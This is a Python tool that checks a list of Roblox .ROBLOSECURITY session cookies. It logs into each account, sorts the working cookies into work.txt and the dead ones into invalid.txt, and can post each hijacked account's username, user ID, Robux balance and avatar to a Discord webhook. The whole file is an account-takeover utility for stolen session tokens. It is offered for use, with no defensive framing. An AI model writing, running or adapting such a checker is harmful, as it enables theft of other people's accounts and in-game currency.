import requests
import os
import curses
import time

cookies_file = 'cookies.txt'
invalid_file_path = 'invalid.txt'
success_file_path = 'work.txt'
webhook_url = ""  # Add your discord webhook URL here
webhookenabled = False

def check_cookie(cookie_value):
    headers = {
        'Cookie': f'.ROBLOSECURITY={cookie_value}'
    }
    profile_url = 'https://www.roblox.com/my/profile'

    try:
        response = requests.get(profile_url, headers=headers, timeout=10)
        response.raise_for_status()
        profile_data = response.json()

        if 'UserId' in profile_data:
            data = {
                'embeds': [
                    {
                        'title': 'Successfully logged into account',
                        'description': (
                            f"User ID: {profile_data['UserId']}\n"
                            f"Robux: {profile_data['Robux']}\n"
                        ),
                        'author': {
                            'name': profile_data['Username'],
                            'icon_url': profile_data['AvatarUri']
                        },
                        'color': 0x00ff00
                    }
                ]
            }
            
            if webhookenabled:
                response = requests.post(webhook_url, json=data)
                time.sleep(3)
            return profile_data['Username'], profile_data['UserId']
        else:
            return None

    except requests.exceptions.RequestException:
        return None

def main(stdscr):
    stdscr.clear()
    curses.curs_set(0)
    stdscr.nodelay(1)
    curses.start_color()
    curses.init_pair(1, curses.COLOR_GREEN, curses.COLOR_BLACK)
    curses.init_pair(2, curses.COLOR_RED, curses.COLOR_BLACK)
    curses.init_pair(3, curses.COLOR_CYAN, curses.COLOR_BLACK)  # Progress bar color

    if not os.path.exists(cookies_file):
        stdscr.addstr(0, 0, f"Cookies file not found: {cookies_file}")
        stdscr.refresh()
        stdscr.getch()
        return

    with open(cookies_file, 'r') as file:
        cookies_content = file.readlines()

    cookies_content = [cookie.strip() for cookie in cookies_content if cookie.strip()]

    if not cookies_content:
        raise ValueError("No cookies found in cookies.txt")
    stdscr.addstr(0, 0, "Checking cookies...")
    stdscr.refresh()

    valid_cookies = []
    invalid_cookies = []

    max_y, max_x = stdscr.getmaxyx()

    for i, cookie_value in enumerate(cookies_content):
        result = check_cookie(cookie_value)
        if result:
            username, user_id = result
            valid_cookies.append((username, user_id))

            with open(success_file_path, 'a+') as work_file:
                work_file.seek(0)
                work_content = work_file.read()
                if cookie_value not in work_content:
                    work_file.write(cookie_value + '\n')
        else:
            invalid_cookies.append(cookie_value)

            with open(invalid_file_path, 'a+') as invalid_file:
                invalid_file.seek(0)
                invalid_content = invalid_file.read()
                if cookie_value not in invalid_content:
                    invalid_file.write(cookie_value + '\n')

        progress = int((i + 1) / len(cookies_content) * 100)
        progress_bar_width = max_x - 20
        filled_length = int(progress_bar_width * (i + 1) // len(cookies_content))
        progress_bar = f"[{'#' * filled_length}{'-' * (progress_bar_width - filled_length)}] {progress}%"
        stdscr.addstr(4, 0, progress_bar, curses.color_pair(3))

        stdscr.addstr(1, 0, f"Total cookies: {len(cookies_content)}")
        stdscr.addstr(2, 0, f"Valid cookies: {len(valid_cookies)}", curses.color_pair(1))
        stdscr.addstr(3, 0, f"Invalid cookies: {len(invalid_cookies)}", curses.color_pair(2))

        if valid_cookies:
            newest_valid = valid_cookies[-1]
            display_str = f"Newest Valid Cookie: {newest_valid[0]} (UserID: {newest_valid[1]})"
            stdscr.addstr(6, 0, display_str[:max_x-1], curses.color_pair(1))  # Truncate to fit width

        stdscr.refresh()
        curses.napms(1)

    stdscr.addstr(1, 0, "Cookie check completed. Press any key to exit.")
    stdscr.refresh()
    stdscr.getch()

if __name__ == '__main__':
    curses.wrapper(main)